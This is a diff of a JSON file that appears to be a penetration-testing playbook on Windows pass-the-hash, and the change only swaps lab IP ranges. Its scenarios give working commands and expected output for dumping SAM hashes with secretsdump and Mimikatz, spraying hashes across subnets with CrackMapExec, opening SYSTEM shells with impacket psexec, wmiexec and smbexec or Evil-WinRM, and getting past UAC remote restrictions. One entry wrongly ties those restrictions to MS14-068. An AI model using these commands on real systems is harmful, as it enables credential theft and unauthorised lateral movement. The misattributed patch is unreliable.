@@ -33,8 +33,8 @@
         },
         {
           "title": "Scenario 2: Hash Extraction and Format Validation",
-          "context": "You have SYSTEM shell on Windows workstation 192.168.50.100. You need to extract NTLM hashes from local SAM database and verify format before attempting pass-the-hash. Wrong hash format wastes time - better to validate first.",
-          "approach": "Method 1 (from Kali): impacket-secretsdump -sam sam.hive -system system.hive LOCAL (requires registry hive dumps from target: reg save HKLM\\SAM sam.hive). Method 2 (from compromised Windows with Mimikatz): privilege::debug; lsadump::sam. Method 3 (remote dump from Kali with admin creds): impacket-secretsdump 'corp/admin:P@ssw0rd@192.168.50.100'. Output format: 'username:rid:lm:ntlm:::'. Extract 4th field (NTLM hash). Validate: must be exactly 32 hexadecimal characters (0-9, a-f). Example: '31d6cfe0d16ae931b73c59d7e0c089c0' = valid. '31d6cfe0d16ae931b73c59d7e0c089c' = invalid (31 chars, missing digit).",
+          "context": "You have SYSTEM shell on Windows workstation 10.10.10.100. You need to extract NTLM hashes from local SAM database and verify format before attempting pass-the-hash. Wrong hash format wastes time - better to validate first.",
+          "approach": "Method 1 (from Kali): impacket-secretsdump -sam sam.hive -system system.hive LOCAL (requires registry hive dumps from target: reg save HKLM\\SAM sam.hive). Method 2 (from compromised Windows with Mimikatz): privilege::debug; lsadump::sam. Method 3 (remote dump from Kali with admin creds): impacket-secretsdump 'corp/admin:P@ssw0rd@10.10.10.100'. Output format: 'username:rid:lm:ntlm:::'. Extract 4th field (NTLM hash). Validate: must be exactly 32 hexadecimal characters (0-9, a-f). Example: '31d6cfe0d16ae931b73c59d7e0c089c0' = valid. '31d6cfe0d16ae931b73c59d7e0c089c' = invalid (31 chars, missing digit).",
           "commands": [
             "secretsdump-hashes",
             "mimikatz-logonpasswords",
@@ -46,42 +46,42 @@
         {
           "title": "Scenario 3: Testing Hash Validity with CrackMapExec",
           "context": "You extracted hash 'fc525c9683e8fe067095ba2ddc971889' for user 'admin' from SAM dump. Before attempting lateral movement with Impacket, you want to quickly test if hash is valid and where it grants access. CrackMapExec provides fast hash validation and network-wide spraying.",
-          "approach": "Test single target: crackmapexec smb 192.168.50.100 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Look for [+] vs [-] indicator. [+] admin:fc525c9... (Pwn3d!) = hash is valid AND you have local admin access. [+] admin:fc525c9... = hash is valid but you're not admin. [-] admin:fc525c9... STATUS_LOGON_FAILURE = hash is invalid (wrong hash, account doesn't exist, password changed). Spray across subnet: crackmapexec smb 192.168.50.0/24 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Identify all machines where this local admin hash is reused (very common - admins use same local admin password across workstations).",
+          "approach": "Test single target: crackmapexec smb 10.10.10.100 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Look for [+] vs [-] indicator. [+] admin:fc525c9... (Pwn3d!) = hash is valid AND you have local admin access. [+] admin:fc525c9... = hash is valid but you're not admin. [-] admin:fc525c9... STATUS_LOGON_FAILURE = hash is invalid (wrong hash, account doesn't exist, password changed). Spray across subnet: crackmapexec smb 10.10.10.0/24 -u admin -H fc525c9683e8fe067095ba2ddc971889 --local-auth. Identify all machines where this local admin hash is reused (very common - admins use same local admin password across workstations).",
           "commands": [
             "pth-cme-spray",
             "cme-smb-auth-test"
           ],
-          "expected_outcome": "Single target test output: 'SMB 192.168.50.100 445 WORKSTATION01 [+] .\\admin:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)'. Pwn3d! indicator means: (1) Hash is valid for this account, (2) Account has local administrator privileges, (3) You can use this hash for lateral movement (PSExec, WMI, etc.). Subnet spray output: '192.168.50.100 (Pwn3d!), 192.168.50.102 (Pwn3d!), 192.168.50.105 (Pwn3d!), 192.168.50.110 (+), 192.168.50.120 (-)'. Interpretation: 3 machines (.100, .102, .105) have same local admin hash and you have admin access. 1 machine (.110) accepts hash but you're not admin (standard user 'admin' account). 1 machine (.120) rejects hash (account doesn't exist or password different). You now have 3 lateral movement targets. This saves hours vs. manually testing each machine with psexec.",
+          "expected_outcome": "Single target test output: 'SMB 10.10.10.100 445 WORKSTATION01 [+] .\\admin:fc525c9683e8fe067095ba2ddc971889 (Pwn3d!)'. Pwn3d! indicator means: (1) Hash is valid for this account, (2) Account has local administrator privileges, (3) You can use this hash for lateral movement (PSExec, WMI, etc.). Subnet spray output: '10.10.10.100 (Pwn3d!), 10.10.10.102 (Pwn3d!), 10.10.10.105 (Pwn3d!), 10.10.10.110 (+), 10.10.10.120 (-)'. Interpretation: 3 machines (.100, .102, .105) have same local admin hash and you have admin access. 1 machine (.110) accepts hash but you're not admin (standard user 'admin' account). 1 machine (.120) rejects hash (account doesn't exist or password different). You now have 3 lateral movement targets. This saves hours vs. manually testing each machine with psexec.",
           "why_this_works": "CrackMapExec automates NTLM authentication testing using pass-the-hash. Under the hood: (1) Connects to SMB port 445, (2) Performs NTLM authentication using provided hash (same protocol as legitimate auth, no password needed), (3) Attempts to access ADMIN$ share (requires local admin), (4) Reports result: Pwn3d! = auth succeeded + admin access, (+) = auth succeeded + standard user, (-) = auth failed. The --local-auth flag forces local account authentication (.\\admin) instead of domain (corp\\admin). This is critical for testing local admin hash reuse. Hash spraying (testing one hash against multiple targets) exploits common misconfiguration: admins set same local admin password on all workstations via GPO or manual configuration. If you compromise one machine's local admin hash, you often compromise 50+ machines instantly."
         },
         {
           "title": "Scenario 4: Lateral Movement with Impacket Pass-the-Hash",
-          "context": "CrackMapExec confirmed hash 'fc525c9683e8fe067095ba2ddc971889' grants local admin access on 192.168.50.100. Now you need interactive shell to dump credentials, search files, or install persistence. Impacket suite provides three pass-the-hash tools: psexec (SYSTEM shell, binary upload), wmiexec (fileless, semi-interactive), smbexec (fileless, similar to wmiexec). Choose based on scenario.",
-          "approach": "PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Syntax: -hashes LM:NTLM (use empty LM hash \u2192 :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@192.168.50.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash.",
+          "context": "CrackMapExec confirmed hash 'fc525c9683e8fe067095ba2ddc971889' grants local admin access on 10.10.10.100. Now you need interactive shell to dump credentials, search files, or install persistence. Impacket suite provides three pass-the-hash tools: psexec (SYSTEM shell, binary upload), wmiexec (fileless, semi-interactive), smbexec (fileless, similar to wmiexec). Choose based on scenario.",
+          "approach": "PSExec (default choice - SYSTEM shell, most reliable): impacket-psexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@10.10.10.100. Syntax: -hashes LM:NTLM (use empty LM hash \u2192 :NTLM). WMIExec (if PSExec detected/blocked): impacket-wmiexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@10.10.10.100. Provides semi-interactive shell via WMI, no binary upload (stealthier). SMBExec (alternative to WMI): impacket-smbexec -hashes :fc525c9683e8fe067095ba2ddc971889 administrator@10.10.10.100. Uses SMB + task scheduler, no service creation. All three tools accept -hashes flag for pass-the-hash.",
           "commands": [
             "pth-impacket-psexec",
             "pth-impacket-wmiexec",
             "pth-impacket-smbexec"
           ],
-          "expected_outcome": "PSExec output: '[*] Requesting shares on 192.168.50.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 192.168.50.100..... [*] Creating service pZmQ on 192.168.50.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary).",
+          "expected_outcome": "PSExec output: '[*] Requesting shares on 10.10.10.100..... [*] Found writable share ADMIN$ [*] Uploading file kLqNDASz.exe [*] Opening SVCManager on 10.10.10.100..... [*] Creating service pZmQ on 10.10.10.100..... [*] Starting service pZmQ..... [!] Press help for extra shell commands Microsoft Windows [Version 10.0.19045.2006] (c) Microsoft Corporation. All rights reserved. C:\\Windows\\system32>'. Run 'whoami' \u2192 'nt authority\\system'. You have SYSTEM shell without password - only hash used for authentication. WMIExec output: '[*] SMBv3.0 dialect used [!] Launching semi-interactive shell - Careful what you execute [!] Press help for extra shell commands C:\\>'. Semi-interactive means: each command executes separately (no persistent cmd.exe process), output returns to Kali terminal. Less interactive than PSExec but fileless (no uploaded binary).",
           "why_this_works": "Impacket implements pass-the-hash by handling NTLM authentication natively in Python. When you provide -hashes :fc525c9..., Impacket: (1) Connects to target SMB/RPC service, (2) Receives NTLM challenge from server, (3) Encrypts challenge using provided hash (without ever needing password), (4) Sends response, (5) Server validates response against stored hash, (6) Authentication succeeds. PSExec then uploads binary and creates service (requires admin). WMIExec uses WMI Win32_Process.Create() method (requires admin, no upload). SMBExec uses scheduled tasks via SMB (requires admin, no service creation). All three work identically to password-based authentication from server's perspective - NTLM protocol doesn't distinguish between 'user knows password' vs 'attacker has hash'."
         },
         {
           "title": "Scenario 5: UAC Restrictions and RID-500 Bypass",
-          "context": "You dumped local admin hash from Workstation01: 'admin:1001:...:fc525c9...'. Hash spray with CrackMapExec shows this hash works on 20+ other workstations (password reuse). But when you try 'impacket-psexec -hashes :fc525c9... admin@192.168.50.102', you get 'STATUS_ACCESS_DENIED' even though CrackMapExec showed (Pwn3d!). This is UAC Remote Restrictions (MS14-068 patch).",
+          "context": "You dumped local admin hash from Workstation01: 'admin:1001:...:fc525c9...'. Hash spray with CrackMapExec shows this hash works on 20+ other workstations (password reuse). But when you try 'impacket-psexec -hashes :fc525c9... admin@10.10.10.102', you get 'STATUS_ACCESS_DENIED' even though CrackMapExec showed (Pwn3d!). This is UAC Remote Restrictions (MS14-068 patch).",
           "approach": "Problem: Microsoft patch KB2871997 (2014) blocks network authentication for all local admin accounts EXCEPT built-in Administrator (RID 500). RID 1001 means user-created admin account - network auth blocked. Solution 1: Use built-in Administrator account hash (RID 500) instead. Extract: secretsdump shows 'Administrator:500:...:31d6cfe0...'. Use THIS hash for pass-the-hash. Solution 2: Use domain account hash (UAC restriction only affects local accounts). Solution 3: Disable UAC restriction via registry (requires existing admin access - chicken-and-egg problem). pentest TIP: Always prioritize RID-500 Administrator hash over other local admin hashes for lateral movement.",
           "commands": [
             "pth-verify-hash-format",
             "secretsdump-hashes",
             "pth-impacket-psexec"
           ],
-          "expected_outcome": "secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@192.168.50.102' \u2192 STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@192.168.50.102' \u2192 SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@192.168.50.102'.",
+          "expected_outcome": "secretsdump output shows two local admin accounts: 'Administrator:500:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 500 = built-in), 'admin:1001:...:8846f7eaee8fb117ad06bdd830b7586c:::' (RID 1001 = user-created). Notice SAME NTLM hash (8846f7...) for both - same password. Test RID-1001 hash: 'impacket-psexec -hashes :8846f7... admin@10.10.10.102' \u2192 STATUS_ACCESS_DENIED (UAC blocked). Test RID-500 hash: 'impacket-psexec -hashes :8846f7... Administrator@10.10.10.102' \u2192 SUCCESS! C:\\Windows\\system32> prompt. INSIGHT: Use Administrator account name (RID 500) even though hash is identical. UAC filter checks RID, not hash. Alternative: If you have domain account hash (corp\\dadmin:fc525c...), use that - UAC restriction doesn't apply to domain accounts: 'impacket-psexec -hashes :fc525c... corp/dadmin@10.10.10.102'.",
           "why_this_works": "UAC (User Account Control) Remote Restrictions introduced in Windows Vista, strengthened in 2014 patch KB2871997. PURPOSE: Prevent lateral movement using local admin accounts (except RID-500). MECHANISM: When non-RID-500 local admin authenticates over network, Windows filters their token to remove admin rights - they get standard user privileges even though they're in Administrators group. This breaks PSExec, WMI, and other admin-required techniques. EXCEPTION: Built-in Administrator account (RID 500) is exempt from filtering - it always gets full admin token over network. pentest IMPLICATION: When dumping SAM hashes, always check RID field. RID 500 = gold for lateral movement. RID 1000+ = might work on some machines (depending on patch level) but unreliable. Domain account hashes are NOT affected by UAC restrictions - they get full admin token if they're in local Administrators group."
         },
         {
           "title": "Scenario 6: Evil-WinRM Pass-the-Hash for Interactive Shell",
           "context": "You have NTLM hash and need best interactive shell from Kali (better than Impacket's semi-interactive WMIExec, more features than PSExec). Target has WinRM enabled (port 5985 open). Evil-WinRM supports pass-the-hash and provides rich PowerShell remoting with file upload/download.",
-          "approach": "Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 192.168.50.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... \u2192 wrong, -H fc525c... \u2192 correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands.",
+          "approach": "Syntax: evil-winrm -i <TARGET> -u <USER> -H <NTLM_HASH>. Example: evil-winrm -i 10.10.10.100 -u administrator -H fc525c9683e8fe067095ba2ddc971889. Do NOT include colon prefix for hash (common mistake: -H :fc525c... \u2192 wrong, -H fc525c... \u2192 correct). Do NOT include LM hash (Evil-WinRM only needs NTLM). Once connected, you get fully interactive PowerShell prompt with: tab completion, command history (up arrow), multi-line commands, built-in upload/download commands.",
           "commands": [
             "evil-winrm-hash",
             "pth-evil-winrm"
@@ -97,7 +97,7 @@
           "commands": [
             {
               "id": "secretsdump-hashes",
-              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@10.10.10.70'",
               "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
             },
             {
@@ -106,18 +106,18 @@
             },
             {
               "id": "pth-verify-hash-format",
-              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
             }
           ]
         },
         {
           "title": "Phase 2: Hash Validation and Spraying",
-          "notes": "Before attempting exploitation, validate hash and identify where it grants access. Use CrackMapExec for fast testing: (1) Single target - 'crackmapexec smb <TARGET> -u <USER> -H <HASH> --local-auth', look for Pwn3d! indicator. (2) Subnet spray - 'crackmapexec smb 192.168.50.0/24 -u admin -H <HASH> --local-auth', identify all vulnerable machines. (3) Domain spray - 'crackmapexec smb <DC> -u <USER> -H <HASH> -d <DOMAIN>', test domain account hash. Hash spraying exploits password reuse - same local admin password across workstations is common misconfiguration.",
+          "notes": "Before attempting exploitation, validate hash and identify where it grants access. Use CrackMapExec for fast testing: (1) Single target - 'crackmapexec smb <TARGET> -u <USER> -H <HASH> --local-auth', look for Pwn3d! indicator. (2) Subnet spray - 'crackmapexec smb 10.10.10.0/24 -u admin -H <HASH> --local-auth', identify all vulnerable machines. (3) Domain spray - 'crackmapexec smb <DC> -u <USER> -H <HASH> -d <DOMAIN>', test domain account hash. Hash spraying exploits password reuse - same local admin password across workstations is common misconfiguration.",
           "commands": [
             {
               "id": "pth-cme-spray",
-              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <TARGET> (Pwn3d!)"
             },
             {
@@ -126,7 +126,7 @@
             },
             {
               "id": "pth-verify-hash-format",
-              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
             }
           ]
@@ -137,22 +137,22 @@
           "commands": [
             {
               "id": "pth-impacket-psexec",
-              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@10.10.10.73",
               "shows": "[*] Requesting shares on <TARGET>"
             },
             {
               "id": "pth-impacket-wmiexec",
-              "example": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "example": "impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@10.10.10.73",
               "shows": "[*] SMBv3.0 dialect used"
             },
             {
               "id": "pth-impacket-smbexec",
-              "example": "impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "example": "impacket-smbexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@10.10.10.73",
               "shows": "[!] Launching semi-interactive shell"
             },
             {
               "id": "evil-winrm-hash",
-              "example": "evil-winrm -i 192.168.50.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
+              "example": "evil-winrm -i 10.10.10.73 -u administrator -H 64f12cddaa88057e06a81b54e73b949b",
               "shows": "Evil-WinRM shell v3"
             }
           ]
@@ -163,17 +163,17 @@
           "commands": [
             {
               "id": "secretsdump-hashes",
-              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@10.10.10.70'",
               "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
             },
             {
               "id": "pth-impacket-psexec",
-              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@192.168.50.73",
+              "example": "impacket-psexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E administrator@10.10.10.73",
               "shows": "[*] Requesting shares on <TARGET>"
             },
             {
               "id": "pth-verify-hash-format",
-              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
             }
           ]
@@ -184,7 +184,7 @@
           "commands": [
             {
               "id": "secretsdump-hashes",
-              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@192.168.50.70'",
+              "example": "impacket-secretsdump 'corp.com/administrator:Password123!@10.10.10.70'",
               "shows": "Output: 'Impacket v0.10.0 - Copyright 2022 SecureAuth Cor..."
             },
             {
@@ -193,7 +193,7 @@
             },
             {
               "id": "pth-cme-spray",
-              "example": "crackmapexec smb 192.168.50.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.0/24 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <TARGET> (Pwn3d!)"
             }
           ]
@@ -204,7 +204,7 @@
           "commands": [
             {
               "id": "pth-verify-hash-format",
-              "example": "crackmapexec smb 192.168.50.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
+              "example": "crackmapexec smb 10.10.10.73 -u administrator -H 2892D26CDF84D7A70E2EB3B9F05C425E",
               "shows": "[+] <DOMAIN>\\<USER>:<NTLM_HASH> (Pwn3d!)"
             },
             {
